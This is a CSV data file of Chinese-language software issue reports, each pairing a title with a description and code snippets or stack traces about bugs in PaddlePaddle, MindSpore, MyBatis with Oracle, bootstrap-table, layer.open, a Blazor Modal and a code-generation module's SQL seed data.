title,text
user requested cancel of current operation,"使用updateByExampleSelective时，偶会出现Caused by: java.sql.SQLException: ORA-01013: user requested cancel of current operation 的错误   <code>: wlqdKpxxDetailParamDO = new WlqdKpxxDetailDO(); wlqdKpxxDetailParamDO.setFpzt(InvoiceStatusEnum.YKPWDY.dm); wlqdKpxxDetailParamDO.setZhxgsj(new Date()); Example wlqdKpxxDetailExample = new Example(WlqdKpxxDetailDO.class); wlqdKpxxDetailExample.createCriteria().andEqualTo(""fpId"", orderInvoiceDTO.getPjId()); wlqdKpxxDetailDAO.updateByExampleSelective(wlqdKpxxDetailParamDO, wlqdKpxxDetailExample);"
飞桨2.0.0RC1 高层API例程报错,"在AIStudio项目版本升级到2.0.0RC1后，发现原来2.0.0.RC0下运行正常的程序报错，到手册找到rc1版本的高层api例程，同样报错。 AIStudio项目版本升级应该是内部升的，现在不管是以前创建的2.0环境，还是新创建项目选择2.0，进入之后都是RC1版本。 高层api例程地址：https://www.paddlepaddle.org.cn/documentation/docs/zh/2.0-rc1/guides/01_paddle2.0_introduction/upgrade_guide_cn.html#id12 项目地址：https://aistudio.baidu.com/aistudio/projectdetail/1222066 报错如下： paddle.distributed.init_parallel_envpaddle.distributed.init_parallel_env` will not do anything."" WARNING:root:DataLoader reader thread raised an exception. Exception in thread Thread-4: Traceback (most recent call last): File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/threading.py"", line 926, in _bootstrap_inner self.run() File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/threading.py"", line 870, in run self._target(*self._args, **self._kwargs) File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/dataloader/dataloader_iter.py"", line 338, in _thread_loop six.reraise(*sys.exc_info()) File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/six.py"", line 703, in reraise raise value File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/dataloader/dataloader_iter.py"", line 308, in _thread_loop batch = self._dataset_fetcher.fetch(indices) File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/dataloader/fetcher.py"", line 65, in fetch data = self.collate_fn(data) File ""/opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/dataloader/dataloader_iter.py"", line 95, in default_collate_fn raise RuntimeError(""Unknown data type {}"".format(type(slot[0]))) RuntimeError: Unknown data type &lt;class 'PIL.Image.Image'&gt; The loss value printed in the log is the current step, and the metric is the average value of previous step. Epoch 1/2 ---------------------------------------------------------------------------SystemError Traceback (most recent call last) in 16 17 # 启动训练 ---&gt; 18 model.fit(train_dataset, epochs=2, batch_size=64, log_freq=200) 19 20 # 启动评估 /opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/hapi/model.py in fit(self, train_data, eval_data, batch_size, epochs, eval_freq, log_freq, save_dir, save_freq, verbose, drop_last, shuffle, num_workers, callbacks) 1490 for epoch in range(epochs): 1491 cbks.on_epoch_begin(epoch) -&gt; 1492 logs = self._run_one_epoch(train_loader, cbks, 'train') 1493 cbks.on_epoch_end(epoch, logs) 1494 /opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/hapi/model.py in _run_one_epoch(self, data_loader, callbacks, mode, logs) 1774 def _run_one_epoch(self, data_loader, callbacks, mode, logs={}): 1775 outputs = [] -&gt; 1776 for step, data in enumerate(data_loader): 1777 # data might come from different types of data_loader and have 1778 # different format, as following: /opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/fluid/dataloader/dataloader_iter.py in next(self) 354 try: 355 if in_dygraph_mode(): --&gt; 356 return self.<em>reader.read_next_var_list() 357 else: 358 if self.<em>return_list: SystemError: (Fatal) Blocking queue is killed because the data reader raises an exception. [Hint: Expected killed</em> != true, but received killed</em>:1 == true:1.] (at /paddle/paddle/fluid/operators/reader/blocking_queue.h:154) [Hint: If you need C++ stacktraces for debugging, please set .]`   <code>: /opt/conda/envs/python35-paddle120-env/lib/python3.7/site-packages/paddle/distributed/parallel.py:119: UserWarning: Currently not a parallel execution environment, will not do anything. ""Currently not a parallel execution environment, FLAGS_call_stack_level=2"
[ST][MS][modelzoo][dcn][gpu] dcn在gpu环境训练失败,"dcn在gpu环境训练失败 / 硬件环境: /device GPU : -- MindSpore version :master commit_id:cde09ee9 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph test_ms_dcn_dynamic_train_infer_gpu_1p_0001.py pytest -s test_ms_dcn_dynamic_train_infer_gpu_1p_0001.py 训练推理成功 转给金修浪   <code>: [CRITICAL] CORE(38656,7f3ca90f6740,python):2022-10-25-10:40:12.667.887 [mindspore/core/ops/reshape.cc:68] update_shape] The accumulate of x_shape must be equal to out_shape, but got x_shape: [const vector][], and out_shape: [const vector][2] [WARNING] MD(38656,7f3ca90f6740,python):2022-10-25-10:40:12.739.064 [mindspore/ccsrc/minddata/dataset/engine/datasetops/data_queue_op.cc:93] ~DataQueueOp] preprocess_batch: 3; batch_queue: 0, 0, 5, 5, 5, 4, 16; push_start_time: 2022-10-25-10:40:11.155.792, 2022-10-25-10:40:11.548.069, 2022-10-25-10:40:11.548.147; push_end_time: 2022-10-25-10:40:11.548.061, 2022-10-25-10:40:11.548.142, 2022-10-25-10:40:12.737.872. Traceback (most recent call last): File ""main.py"", line 49, in &lt;module&gt; trainer.train() File ""/home/jenkins0/solution_test/cases/02network/09audio/dcn/train/test_ms_dcn_dynamic_train_infer_gpu_1p_0001/dcn_ms_trainer.py"", line 103, in train model.train(self.num_epochs, dataset, callbacks=callback_list) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 1062, in train initial_epoch=initial_epoch) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 98, in wrapper func(self, *args, **kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 624, in _train cb_params, sink_size, initial_epoch, valid_infos) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/train/model.py"", line 702, in _train_dataset_sink_process outputs = train_network(*inputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 619, in __call__ out = self.compile_and_run(*args) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 1004, in compile_and_run self.compile(*inputs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 976, in compile jit_config_dict=self._jit_config_dict) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 1150, in compile result = self._graph_executor.compile(obj, args_list, phase, self._use_vm_mode()) ValueError: The accumulate of x_shape must be equal to out_shape, but got x_shape: [const vector][], and out_shape: [const vector][2]"
一个页面两个bootstrap-table都需要触发responseHandler，两个函数获取data或取值undifiend,"一个页面两个bootstrap-table都需要触发responseHandler，两个函数获取data赋值会都是undifiend，然后需要点击form查询才能出来，如果是一个table就正常 responseHandler: function (data1) { $('#countSum1').html(''); $('#totalFeeSum1').html(''); $('#sealtSum1').html(''); if (data1.code = ""00000"") { $('#countSum1').html('累计销量：'+data1.countSum1+' 件'); $('#totalFeeSum1').html('累计订单总额：'+data1.totalFeeSum1+' 元'); $('#sealtSum1').html('累计结算总额：'+data1.sealtSum1+' 元'); } }   <code>: responseHandler: function (data2) { $('#countSum2').html(''); $('#totalFeeSum2').html(''); if (data2.code = ""00000"") { $('#countSum2').html('累计商品数量 ：'+data2.countSum2+' 件'); $('#totalFeeSum2').html('累计金额小计：'+data2.totalFeeSum2+' 元'); } }"
[MDT][PERF]resample算子特定场景下性能比不过对标librose,"在gcd值（orig_freq和new_freq的最小公约数）偏小的情况下,MindData算子resample的性能比不过对标框架 / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version :commit_id = '[sha1]:e2c89157,[branch]:(HEAD,origin/master,origin/HEAD,master)' -- Python version :Python 3.7.5 -- OS platform and distribution :Ubuntu 18.04.6 LTS -- GCC/Compiler version : gcc (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0 (/): 修改参数值，执行脚本 minddata time &lt; librose time 见附件   <code>: import numpy as np from mindspore import log as logger import mindspore.dataset as ds import mindspore.dataset.audio.transforms as audio from mindspore.dataset.audio.utils import ResampleMethod import librosa import time import torch import torchaudio.functional import math from torch.utils.data import Dataset def testEagerTorchAudio(input_shape, orig_freq, new_freq): waveform = np.random.rand(*input_shape) * 100 orig_freq = orig_freq sleep_time = 10 new_freq = new_freq times2 = 100 print(""waveform.shape"", waveform.shape) print(""orig_freq:"", orig_freq) print(""new_freq:"", new_freq) print(""gcd:"", math.gcd(orig_freq, new_freq)) time.sleep(sleep_time) start_time = time.time() for i in range(times2): audio.Resample(orig_freq=orig_freq, new_freq=new_freq)(waveform) end_time = time.time() output1 = audio.Resample(orig_freq=orig_freq, new_freq=new_freq)(waveform) print(""minddata time over "", times2, "" runs is "", (end_time - start_time) / times2 * 1000 ** 2, ""?s"") time.sleep(sleep_time) times = 100 start_time = time.time() for i in range(times): librosa.core.resample(waveform, orig_sr=orig_freq, target_sr=new_freq) end_time = time.time() print(""librosa resample average time over"", times, ""runs is "", (end_time - start_time) / times * 1000 ** 2, ""?s"") time.sleep(sleep_time) waveform2 = torch.from_numpy(waveform) start_time = time.time() times3 = 1 for i in range(times3): torchaudio.functional.resample(waveform2, orig_freq=orig_freq, new_freq=new_freq) end_time = time.time() output3 = torchaudio.functional.resample(waveform2, orig_freq=orig_freq, new_freq=new_freq) output3 = output3.detach().numpy() print(""pytorch time over "", times3, ""runs is "", (end_time - start_time) / times3 * 1000 ** 2, ""?s"") print(abs(output3 - output1)) assert (np.all(output1 - output3 &lt; 1e-5)) if __name__ == '__main__': if __name__ == '__main__': test_data = [{""waveform"": (1000, 1000), ""orig_freq"": 16000, ""new_freq"": 160000}, {""waveform"": (1000, 1000), ""orig_freq"": 16000, ""new_freq"": 48000}, {""waveform"": (1000, 1000), ""orig_freq"": 16000, ""new_freq"": 8000}, {""waveform"": (1000, 1000), ""orig_freq"": 16000, ""new_freq"": 11000}, {""waveform"": (1000, 1000), ""orig_freq"": 16000, ""new_freq"": 500}, {""waveform"": (1000, 1000), ""orig_freq"": 16000, ""new_freq"": 11025}, {""waveform"": (1000, 1000), ""orig_freq"": 16000, ""new_freq"": 11005}, {""waveform"": (1000, 1000), ""orig_freq"": 22050, ""new_freq"": 44100}, {""waveform"": (1000, 1000), ""orig_freq"": 22050, ""new_freq"": 11025}, {""waveform"": (1000, 1000), ""orig_freq"": 22050, ""new_freq"": 500}, {""waveform"": (1000, 1000), ""orig_freq"": 22050, ""new_freq"": 11005}, {""waveform"": (17, 12345), ""orig_freq"": 16000, ""new_freq"": 160000}, {""waveform"": (17, 12345), ""orig_freq"": 16000, ""new_freq"": 48000}, {""waveform"": (17, 12345), ""orig_freq"": 16000, ""new_freq"": 8000}, {""waveform"": (17, 12345), ""orig_freq"": 16000, ""new_freq"": 11000}, {""waveform"": (17, 12345), ""orig_freq"": 16000, ""new_freq"": 500}, {""waveform"": (17, 12345), ""orig_freq"": 16000, ""new_freq"": 11025}, {""waveform"": (17, 12345), ""orig_freq"": 16000, ""new_freq"": 11005}, {""waveform"": (16560,), ""orig_freq"": 24000, ""new_freq"": 48000}, {""waveform"": (16560,), ""orig_freq"": 24000, ""new_freq"": 16000}, {""waveform"": (16560,), ""orig_freq"": 24000, ""new_freq"": 1600}, {""waveform"": (16560,), ""orig_freq"": 24000, ""new_freq"": 11025}, {""waveform"": (16560,), ""orig_freq"": 24000, ""new_freq"": 11005}, {""waveform"": (7432986,), ""orig_freq"": 16000, ""new_freq"": 48000}, {""waveform"": (7432986,), ""orig_freq"": 16000, ""new_freq"": 24000}, {""waveform"": (7432986,), ""orig_freq"": 16000, ""new_freq"": 1600}, {""waveform"": (7432986,), ""orig_freq"": 16000, ""new_freq"": 11025}, {""waveform"": (241840,), ""orig_freq"": 16000, ""new_freq"": 48000}, {""waveform"": (241840,), ""orig_freq"": 16000, ""new_freq"": 24000}, {""waveform"": (241840,), ""orig_freq"": 16000, ""new_freq"": 1600}, {""waveform"": (241840,), ""orig_freq"": 16000, ""new_freq"": 11025}, {""waveform"": (241840,), ""orig_freq"": 16000, ""new_freq"": 11005}, {""waveform"": (2, 125800), ""orig_freq"": 22050, ""new_freq"": 11025}, {""waveform"": (2, 125800), ""orig_freq"": 22050, ""new_freq"": 44100}, ] for data in test_data: testEagerTorchAudio(input_shape=data[""waveform""], orig_freq=data[""orig_freq""], new_freq=data[""new_freq""])"
u-button导致点击事件需要点击两次,子组件用到，把点击事件传给父组件，点击父组件的事件时，需点击两次才生效，可能是嵌套太深导致的，希望修复该问题   <code>: u-button
[CT][MS][CPU]Failure info [invalid output_idx].,"Failure info [invalid output_idx]. / 硬件环境: /device CPU : -- MindSpore version :master-46217 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph pytest -s parse/test_parser_builtin_1.py::test_fallback_tuple_with_input_tensor case pass   <code>: def test_fallback_tuple_with_input_tensor(): contextbase.case_prepare() @numpy_native_wrapper() def func(): x = tuple(Tensor([1, 2])) y = () return x, y &gt; out, out_y = func() self = &lt;mindspore.common.api._MindsporeFunctionExecutor object at 0x7fe4c4308110&gt; args = (), args_list = () phase = 'MindSporeTest.share.utils.func_graph./home/jenkins-slave/workspace/MindSpore_ME_Version_Featrue_Daily_EulerOS_CPU/MindSporeTest/share/utils.py.506.1670454935943419904.2' @_wrap_func def __call__(self, *args): args_list = args if self.obj is not None: args_list = args_list[1:] try: _pynative_executor.set_ms_function_compile_status(True) phase = self.compile(args_list, self.fn.__name__) _pynative_executor.set_ms_function_compile_status(False) except Exception as err: _pynative_executor.clear_res() raise err if context.get_context(""precompile_only""): return None new_inputs = self._generate_run_args(args_list) &gt; output = self._graph_executor(tuple(new_inputs), phase) E RuntimeError: Failure info [invalid output_idx]. E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/ccsrc/utils/anfalgo.cc:708 GetOutputObjectType /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py:309: RuntimeError"
富文本内容被转义导致格式丢失的问题,更新到最新框架后，原来正常的使用了UEditor组件编辑后，换行以及等标签都丢失了。   <code>: &lt;hr/&gt;&lt;center&gt;
MacOsX run pserver failed: *--*.whl is not a valid wheel filename.,"mac上通过 pip install paddlepaddle之后，跑pserver 报错 检查目录 并不存在   <code>: sudo -H paddle pserver --port=7164 --ports_num=1 --ports_num_for_sparse=1 --num_gradient_servers=1 --nics=eth0 /usr/local/bin/paddle: line 82: [: 1.0.2: binary operator expected File ""&lt;stdin&gt;"", line 3 if LooseVersion(""1.0.2 ^ SyntaxError: EOL while scanning string literal First time run paddle, need to install some python dependencies. Requirement '/usr/local/bin/../opt/paddle/share/wheels/*--*.whl' looks like a filename, but the file does not exist *--*.whl is not a valid wheel filename. pip install wheels failed. Please use 'sudo paddle' at the first time you use PaddlePaddle PaddlePaddle will install some python dependencies automatically. /usr/local/bin/../opt/paddle/share/wheels/"
ry-ui.js封装的$.modal.openOptions把layer.open的按钮回调功能丧失了,"这里如果再定义options.btn2回调方法不起作用   <code>: layer.open({ content: 'test' ,btn: ['按钮一', '按钮二', '按钮三'] ,yes: function(index, layero){ //按钮【按钮一】的回调 } ,btn2: function(index, layero){ //按钮【按钮二】的回调 //return false 开启该代码可禁止点击该按钮关闭 } ,btn3: function(index, layero){ //按钮【按钮三】的回调 //return false 开启该代码可禁止点击该按钮关闭 } ,cancel: function(){ //右上角关闭回调 //return false 开启该代码可禁止点击该按钮关闭 } }); options.btn: ['&lt;i class=""fa fa-check""&gt;&lt;/i&gt; 确认', '&lt;i class=""fa fa-check""&gt;&lt;/i&gt; 提交审核', '&lt;i class=""fa fa-close""&gt;&lt;/i&gt; 关闭'];"
用户使用momentum optimizer时出现cast op输入不存在错误,"用户反馈在使用momentum optimizer时append backward出现cast op错误，用其他optimizer未出现错误。 Paddle版本release 1.2。 code: 错误log（编译期错误）： 解决方案：将某些不需要梯度的变量设置为stop_gradient=True，例如   <code>: def balanced_cross_entropy_bootstrap_loss(prediction, gt_org, average_flag = True, bootstrapped_threshold=0.95): class_num = prediction.shape[1] #get gt_mask gt = fluid.layers.reshape(gt_org, [0, 1, gt_org.shape[-2], gt_org.shape[-1]]) gt_mask = (gt==0).astype('float32') for i in range(1, class_num): gt_mask_i = (gt==i).astype('float32') gt_mask = fluid.layers.concat([gt_mask, gt_mask_i], axis=1) #get valid_mask valid_mask = (gt &lt; class_num).astype('float32') valid_mask = fluid.layers.expand(valid_mask, [1, class_num, 1, 1]) #bootstrap prediction = prediction.astype('float32') pred = fluid.layers.argmax(prediction, axis=1).astype('float32') pred = fluid.layers.reshape(pred, [0, 1, pred.shape[-2], pred.shape[-1]]) bootstrap_valid1 = (pred == gt).astype('float32') bootstrap_valid1 = fluid.layers.expand(bootstrap_valid1, [1, class_num, 1, 1]) bootstrap_valid2 = (prediction &gt; bootstrapped_threshold).astype('float32') bootstrap_valid = fluid.layers.elementwise_mul(bootstrap_valid2, bootstrap_valid1) bootstrap_mask = (1.0 - bootstrap_valid).astype('float32') #print(bootstrap_mask) #print(valid_mask) valid_mask = fluid.layers.elementwise_mul(bootstrap_mask, valid_mask).astype('float32') #get valid gt_mask #gt_mask = fluid.layers.elementwise_mul(gt_mask, valid_mask).astype('float32') #get balanced weight count_num = fluid.layers.reduce_sum(gt_mask, dim=[2, 3]).astype('float32') count_num = fluid.layers.elementwise_max(count_num, fluid.layers.assign(np.array([0.00001], dtype=np.float32))) balanced_weight = 1 - count_num/fluid.layers.reduce_sum(count_num, dim=1).astype('float32') #count_num [n,c] balanced_gt_mask = fluid.layers.elementwise_mul(gt_mask, balanced_weight, axis=0).astype('float32') #gt_mask=[n,c,h,w] balanced_weight=[n,c] prediction = fluid.layers.softmax(prediction).astype('float32') prediction = fluid.layers.elementwise_max(prediction, fluid.layers.assign(np.array([0.00001], dtype=np.float32))) prediction = fluid.layers.log(prediction).astype('float32') loss_mask = fluid.layers.elementwise_mul(prediction, balanced_gt_mask, axis=0) if average_flag: valid_loss = fluid.layers.reduce_mean(fluid.layers.elementwise_mul(loss_mask, valid_mask)) #valid_loss = fluid.layers.reduce_mean(loss_mask) else: valid_loss = fluid.layers.reduce_sum(fluid.layers.elementwise_mul(loss_mask, valid_mask, axis=0)) return valid_mask, -1*valid_loss The input of cast op must be set. bootstrap_mask.stop_gradient = True valid_mask.stop_gradient = True"
 Online表单开发中新增或编辑时浏览器控制台报出警告,版本号：   <code>: vue前端 vue-antd-jeecg ：3.0.0 Online表单开发中点击新增，或选择任意数据点击编辑，浏览器控制台都会报出警告
starter-oracle.sql 中的 core_menu 表中的“代码生成**”值与 starter-mysql.sql 及 CoreCodeGenService.java 中的不一致,"建议： 将 中的“代码生成管理”改为“代码生成导航”。 起因： 使用 Oracle 数据库对应的 创建数据库后，生成代码选择“添加到菜单”后，一直无法添加到菜单。 过程： 查数据库的 表发现无此代码功能，查控制台信息发现： 发现 中 而 表中只有“代码生成管理”。 就想到是创建数据库问题，对比 和 发现，两者在插入 表时有关“代码生成**”的项不一致，Oracle 版为“代码生成管理”，Mysql 版为“代码生成导航”。   <code>: starter-oracle.sql orcale-stater.sql core_menu com.ibeetl.admin.core.service.CoreCodeGenService insertMenu 194 - 未找到对应的父菜单:代码生成导航 CoreCodeGenService.java Line 190 query.setCode(""代码生成导航""); core_menu starter-oracle.sql starter-mysql.sql core_menu"
【众智】【计算-AICPU开发】DenseToDenseSetOperation,"DenseToDenseSetOperation 1.1 功能介绍 对2个输入Tensor的最后一个维度应用'set'(去重)操作 1.2 接口描述 Python 层接口 接口目录：mindspore/ops/operations/sparse_ops.py class DenseToDenseSetOperation(Primitive): 无反向   <code>: REG_OP(DenseToDenseSetOperation) .INPUT(x1, TensorType({DT_INT8, DT_INT16, DT_UINT16, DT_UINT8, \ DT_INT32, DT_INT64, DT_STRING})) .INPUT(x2, TensorType({DT_INT8, DT_INT16, DT_UINT16, DT_UINT8, \ DT_INT32, DT_INT64, DT_STRING})) .OUTPUT(y_indices, TensorType({DT_INT64})) .OUTPUT(y_values, TensorType({DT_INT8, DT_INT16, DT_UINT16, DT_UINT8, \ DT_INT32, DT_INT64, DT_STRING})) .OUTPUT(y_shape, TensorType({DT_INT64})) .ATTR(set_operation, String, """") .ATTR(validate_indices, Bool, true) .OP_END_FACTORY_REG(DenseToDenseSetOperation)"
源代码实施 Google Java Style 代码风格规范及相关文档、工具,源代码实施 Google Java Style 代码风格规范及相关文档、工具。具体看 styleguide 分支，docs/styleguide 。 特别指出，因为涉及较大的修改，建议上游 master 如果最近有较多修改，可以关闭这次 PR ，等待 master 更新后，由我再整合之后重新 PR 。 特别指出，目前还有最后 13 处涉及名称 Names 相关的不规范项未处理，因为涉及重构、兼容，待谨慎处理。例如： 特别指出，现在补充的某些 Javadoc ，是由 IDEA 的 Javadoc 插件自动生成，有意义，后面有需要时可以由开发再补充完善。 感谢。目前纯属个人想法，觉得有必要应用一个代码风格规范，有利于保证代码质量的任何措施都值得实施。   <code>: Checkstyle found 13 item(s) in 12 file(s) ActionATGServiceImpl.java : 1 item(s) 名称 'ActionATGServiceImpl' 中不能出现超过 '2' 个连续大写字母。 (33:0) [AbbreviationAsWordInName] ActionCGServiceImpl.java : 1 item(s) 名称 'ActionCGServiceImpl' 中不能出现超过 '2' 个连续大写字母。 (33:0) [AbbreviationAsWordInName] ... TaskDTO.java : 1 item(s) 名称 'TaskDTO' 中不能出现超过 '2' 个连续大写字母。 (30:0) [AbbreviationAsWordInName] UserDTO.java : 1 item(s) 名称 'UserDTO' 中不能出现超过 '2' 个连续大写字母。 (38:0) [AbbreviationAsWordInName]
Modal框弹出时，绑定数据无法刷新显示,"1.创建Modal，绑定数据对象 2.弹出显示 3.对话框所有字段无数据，输入其中一项，点击别的地方，所有字段刷新出来了 无 组件版本 latest 浏览器 all Server Side   <code>: @page ""/table"" &lt;Table TItem=""Foo"" IsPagination=""true"" PageItemsSource=""@PageItemsSource"" IsStriped=""true"" IsBordered=""true"" ShowSkeleton=""true"" IsMultipleSelect=""true"" ShowToolbar=""true"" ShowSearch=""true"" ShowExtendButtons=""true"" UseInjectDataService=""true"" AutoGenerateColumns=""true""&gt; &lt;TableColumns&gt; &lt;TableColumn @bind-Field=""@context.Name"" Filterable=""true"" TextEllipsis=""true"" ShowTips=""true"" /&gt; &lt;TableColumn @bind-Field=""@context.Address"" Filterable=""true"" TextEllipsis=""true"" ShowTips=""true"" /&gt; &lt;TableColumn @bind-Field=""@context.Hobby"" Data=""@Hobbys"" /&gt; &lt;/TableColumns&gt; &lt;RowButtonTemplate&gt; &lt;TableCellButton Size=""Size.ExtraSmall"" Color=""Color.Primary"" TItem=""Foo"" Item=""@context"" Icon=""fa fa-pencil"" Text=""test"" OnClickCallback=""@(() =&gt; OnEditClick(context))"" /&gt; &lt;/RowButtonTemplate&gt; &lt;/Table&gt; &lt;Modal @ref=""Modal""&gt; &lt;ModalDialog @ref=""ModalDialog"" IsDraggable=""true"" Size=""Size.ExtraLarge"" Title=""论文评审结果汇总""&gt; &lt;BodyTemplate&gt; &lt;table&gt; &lt;tbody&gt; &lt;tr style=""height:60px""&gt; &lt;td&gt; &lt;div class=""input-group-prepend""&gt; &lt;div class=""input-group-text""&gt; &lt;span style=""width:100px""&gt;姓名:&lt;/span&gt; &lt;/div&gt; &lt;/div&gt; &lt;/td&gt; &lt;td width=""100%""&gt; &lt;BootstrapInput @bind-Value=""@cur.Name"" ShowButton=""true"" Max=""100"" Min=""50""&gt;&lt;/BootstrapInput&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr style=""height:60px""&gt; &lt;td&gt; &lt;div class=""input-group-prepend""&gt; &lt;div class=""input-group-text""&gt; &lt;span style=""width:100px""&gt;地址:&lt;/span&gt; &lt;/div&gt; &lt;/div&gt; &lt;/td&gt; &lt;td width=""100%""&gt; &lt;BootstrapInput @bind-Value=""@cur.Address"" ShowButton=""true"" Max=""100"" Min=""50""&gt;&lt;/BootstrapInput&gt; &lt;/td&gt; &lt;/tr&gt; &lt;tr style=""height:60px""&gt; &lt;td&gt; &lt;div class=""input-group-prepend""&gt; &lt;div class=""input-group-text""&gt; &lt;span style=""width:100px""&gt;count:&lt;/span&gt; &lt;/div&gt; &lt;/div&gt; &lt;/td&gt; &lt;td width=""100%""&gt; &lt;BootstrapInput @bind-Value=""@cur.Count"" ShowButton=""true"" Max=""100"" Min=""50""&gt;&lt;/BootstrapInput&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/tbody&gt; &lt;/table&gt; &lt;/BodyTemplate&gt; &lt;/ModalDialog&gt; &lt;/Modal&gt; ---------------------------------- private Modal? Modal { get; set; } private ModalDialog? ModalDialog { get; set; } private Foo cur = new Foo(); Task&lt;bool&gt; OnEditClick(Foo item) { cur = item; Modal?.Show(); return Task.FromResult(true); }"
Design doc of functor,We should make Paddle fast even we using . So we should give a way to fuse many fine-grained functors to a single GPU kernel. The design doc should be written first.   <code>: Operator
